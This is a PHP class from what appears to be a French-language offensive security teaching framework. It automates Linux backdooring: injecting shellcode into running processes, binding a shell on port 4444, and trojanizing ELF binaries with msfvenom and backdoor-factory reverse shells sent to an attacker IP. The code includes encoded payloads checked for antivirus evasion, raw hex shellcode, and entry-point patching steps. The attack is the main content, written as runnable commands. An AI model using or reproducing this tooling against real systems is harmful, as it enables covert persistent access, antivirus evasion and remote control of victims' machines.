<?php
class inject4linux extends backdoor4linux{
	var $source_bin ;
	
	public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass) {
	    parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass);
	}
	
	
	
	public function rooted_linux_injected_into_pid() {
	    $this->gtitre("Inject Shellcode into an existing process on Linux" );
	    //$this->img("$this->dir_img/bof/memore_vive_processus.png");
	    //intro::backdoor_linux_ptrace_intro();
	    
	    
	    $this->titre("Shellcode execve + argv(cmd) = Exec Command into an existing process  " );
	    $this->article("DO", "Prog ton inject in -> Show Process PID and PPID" );
	    $this->requette("gcc $this->dir_c/ptrace_prog_target.c -ggdb -o $this->file_dir/ptrace_prog_target.elf -m32" );
	    $prog_target = "$this->file_dir/ptrace_prog_target.elf";
	    $this->requette("cp -v $this->dir_c/meminj.c $this->dir_tmp/meminj.c ");
	    $file_elf = new file("$this->dir_tmp/meminj.c");
	    $prog_inject = $file_elf->file_c2elf("-m32");
	    
	    
	    $this->titre("Inject via argv /bin/sh" );
	    
	    $cmd1 = "$prog_target";
	    $cmd2 = "echo '$this->root_passwd' | sudo -S $prog_inject -p `pidof $prog_target` -c /bin/sh ";
	    $this->cmd("localhost","$cmd1");
	    $this->cmd("localhost","$cmd2");
	    /*
	     $cmd3 = "cd $this->file_dir; gcore  `pidof $prog_target`";
	     $cmd4 = "echo '$this->root_passwd' | sudo -S insmod /opt/LiME/src/lime-`uname -r`.ko \"path=$prog_target.lime format=lime\" ";
	     $cmd5 = "hexdump -C $this->file_dir/core.7734 | grep 'ELF' -A4 ";
	     
	     $this->cmd("localhost","$cmd3");
	     $this->cmd("localhost","$cmd4");
	     $this->cmd("localhost","$cmd5");
	     $this->pause();
	     $this->requette($cmd5);
	     
	     //
	     //$this->install_for_vol_profile_localhost();$this->pause();
	     
	     $analyse_file = new for4linux("$prog_target.lime", "LinuxUbuntu16044x64");
	     $analyse_file->for4linux_Malware_malfind("");
	     $this->pause();
	     */
	    
	    $this->titre("Inject Shellcode" );
	    if (! file_exists("/opt/code-injector/bind_sh_32.s" )) $this->install_malware_code_injector();
	    $this->requette("gedit /opt/code-injector/bind_sh_32.s 2&> /dev/null" );
	    $this->requette("as --32 /opt/code-injector/bind_sh_32.s -o $this->file_dir/bind_sh_32.o" );
	    $this->requette("objcopy -O binary $this->file_dir/bind_sh_32.o $this->file_dir/bind_sh_32.bin" );
	    $this->pause();
	    
	    $this->cmd("localhost", $prog_target );
	    $this->pause();
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S /opt/code-injector/injector `pidof $prog_target` < $this->file_dir/bind_sh_32.bin" );
	    $this->article("DO", "une fois les commandes ci dessus lancer, on lance le reste" );
	    $this->cmd("localhost", "nc localhost 4444 -v" );
	    
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S netstat -tupan | grep '4444' " );
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S ps aux | grep '$prog_target' " );
	    // dumper la memoire du processus
	    $this->pause();
	    /*
	     *
	     * if (!file_exists("/opt/parasite/trunk/bin/parasite")) requette("cd /opt/; sudo svn checkout https://github.com/jtripper/parasite ; sudo chown -R $this->user2local :$this->user2local /opt/parasite;cd /opt/parasite; make");
	     * pause();
	     *
	     * titre("On 64 Bits");
	     * question("dans quel processus peut-on injecter notre code"); // firefox / anti-virus
	     * ssTitre("Looking for other interesting Process exec");
	     * requette("ps aux");
	     * $tmp = req_ret("pidof /usr/lib/firefox/firefox");
	     * $firefox_pid = $tmp[0];unset($tmp);
	     * requette("msfvenom --payload  linux/x86/shell_reverse_tcp LPORT=6666 LHOST=$lts R | tee $this->file_dir/reverse_sh_64.raw ");
	     * cmd($lts,"nc -l 6666 -v");pause();
	     * cmd("localhost","echo '$this->root_passwd' | sudo -S /opt/code-injector/injector $firefox_pid < $this->file_dir/reverse_sh_64.raw");pause();
	     * requette("ps aux | grep '$prog_target' | head -1 ");
	     * requette("echo '$this->root_passwd' | sudo -S netstat -tupan | grep '5544' ");
	     * pause();
	     */
	}
	
	
	
	public function root2backdoor8inject2pid($pid){
	    
	}
	
	
	
	public function root2backdoor8inject2app($app){
	    
	}
	
	


	

	public function backdoor_linux_injected_into_app_32_no_forked() { // ne fonctionne pas 
		$this->ssTitre(__FUNCTION__);
		$this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
		$query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port -t elf -x $this->source_bin -e x86/shikata_ga_nai -i 1 --arch x86 --platform linux -o $this->file_path";
		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user_local:$this->user_local $this->file_path " );}
		else $this->cmd($this->prof,$query);
		$this->requette("du -b $this->source_bin $this->file_path");
		$this->file_file2virus2vt(); // 0 / 57
		return $this;
	}

	

	
	public function backdoor_linux_injected_into_app_32_shellcode() {
		$this->ssTitre(__FUNCTION__);
		$this->cmd($this->prof,"nc -l -p $this->attacker_port -v -k");
		$query = "backdoor-factory -v -f $this->source_bin -F x86 -H $this->attacker_ip -P $this->attacker_port -s reverse_shell_tcp  --output-file=$this->file_ext ; cp ./backdoored/$this->file_ext $this->dir_tmp ; rm -vr ./backdoored "; // -H $this->attacker_ip -P $this->attacker_port -s reverse_shell_tcp
		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user_local:$this->user_local $this->file_path " );}
		else $this->cmd($this->prof,$query);
		$this->requette("du -b $this->source_bin $this->file_path");
		$this->file_file2virus2vt(); // 0 / 57
		$cmd1 = "nc -l $this->attacker_port -v";
		$cmd2 = "$this->file_path";
		$this->exec_parallel($cmd1, $cmd2, 2);
		return $this;
	}
	
	
	

	public function backdoor_linux_injected_into_app_32_shellcode_poc() {
		
		
		$this->requette("cp -v $this->dir_c/Code_injector_under_ELF_programs.c $this->dir_tmp/Code_injector_under_ELF_programs.c ");
		
		
		$file_elf = new file("$this->dir_tmp/Code_injector_under_ELF_programs.c");
		$programme_inject = $file_elf->file_c2elf("-fno-stack-protector -z execstack");
	
		$this->ssTitre("Shellcode Used into Script Elf-poison" );
		$this->requette("cat $this->dir_c/Code_injector_under_ELF_programs.c | grep 'shellcode\[\]' -A8 " );
		$shellcode_hex = $this->shellcode_hello_world;
		$this->hex2exec($shellcode_hex);
		// $shellcode_hex = '\xda\xdf\xbd\xb2\x9a\x13\x3b\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x6e\x1a\x03\x6e\x1a\x83\xee\xfc\xe2\x47\xf0\x18\x63\x3e\x57\x79\xfb\x6d\x3b\x0c\x1c\x05\x94\x7d\x8b\xd5\x82\xae\x29\xbc\x3c\x38\x4e\x6c\x29\x32\x91\x90\xa9\x6c\xf3\xf9\xc7\x5d\x80\x91\x17\xf5\x35\xe8\xf9\x34\x39';
		// $shellcode_hex = "\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80";
		// $shellcode_hex = '\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e';
		
		$this->pause();
		 
		$this->requette("readelf -h $this->source_bin | grep -E \"(Entry point address|Adresse du point d'entrée)\" " );
		$last_entry = $this->req_ret_str("readelf -h $this->source_bin | grep -E \"(Entry point address|Adresse du point d'entrée)\" | cut -d'x' -f2 " );
		$this->pause();
		$this->requette("$programme_inject $this->file_path" );
		$this->requette($this->file_path);
		$this->requette("readelf -h $this->file_path | grep -E \"(Entry point address|Adresse du point d'entrée)\" " );
		$new_entry = $this->req_ret_str("readelf -h $this->file_path | grep -E \"(Entry point address|Adresse du point d'entrée)\" | cut -d'x' -f2 " );
		$this->pause();
		
		$this->requette("readelf -a $this->source_bin > $this->source_bin.readelf");
		$this->requette("readelf -a $this->file_path > $this->file_path.readelf");
		$this->pause();
		$this->titre("Diff Between Clean and Injected App" );
		$this->requette("diff $this->source_bin.readelf $this->file_path.readelf" );
		$this->pause();
		$this->requette("hexdump -C $this->source_bin > $this->source_bin.hexdump");
		$this->requette("hexdump -C $this->file_path > $this->file_path.hexdump");
		$this->pause();
		$this->titre("Diff Between Clean and Injected App" );
		$this->requette("diff $this->source_bin.hexdump $this->file_path.hexdump" );
		$this->pause();
		
		$this->requette("du -b $this->source_bin $this->file_path" );
		$this->requette("du -h $this->source_bin $this->file_path" );
		$this->requette("sha256sum $this->source_bin $this->file_path" );

		$this->note("les fichiers sont differents mais la taille des deux fichiers est identique -> on a simplement remplacer des opcodes. -> voir avec 'objdump -M Intel -d -s -j .note.ABI-tag' " );
		$this->pause();
		$this->article("we find in diff", "addr entry point + pusha + shellcode + popa + jump " );
		$this->pause();
		
		$this->article("pusha 0x60", "empile tous les registres avant de débuter le code" );
		$this->article("popa 0x61", "dépile tous les registres" );
		$this->article("Pour résumer", "Voici la marche à suivre pour réaliser notre injection :
- Trouver un espace assez grand entre deux segments PT_LOAD, pour y insérer notre code.
- A la fin de notre code, rajouter une instruction jmp qui retournera au point d’entrée initial.
- Modifier le point d’entrée pour qu’il pointe sur notre code.
- Mettre à jour la taille du segment où est effectuée l’insertion." );

		$this->pause();
		$size_shellcode = $this->hex2size($shellcode_hex);
		$max_data_injected = 1+$size_shellcode+1+5;
		$this->ssTitre("Max Data Injected(push a + Shellcode (Max) + pop a + jmp = 1 + $size_shellcode + 1 + 5 = $max_data_injected" );
		$this->ssTitre("New Size LOAD " );
		$load_start = $this->req_ret_str("readelf -l $this->source_bin | grep LOAD | grep 0x08048000 | cut -d' ' -f17");
		$new_load_start_offset = $this->req_ret_str("php -r \"echo dechex(hexdec('$load_start')+$max_data_injected);\";echo " );
		$this->ssTitre("New Point Entry to Overwrite" );
		$this->requette("readelf -l $this->source_bin | grep LOAD | grep 0x08048000 " );
		$new_entry_point_addr = $this->req_ret_str("php -r \"echo dechex(hexdec('0x08048000')+hexdec('$load_start') );\";echo " );
		$this->pause();
		$this->ssTitre("New Addr JMP" );
		$new_addr_jump = $this->req_ret_str("php -r \"echo dechex(hexdec('0xffffffff')+(hexdec('0x$last_entry')-hexdec('0x$new_entry_point_addr')-$max_data_injected+1) );\";echo " );
		$this->pause();
		
		
		
			}
	
	
	
}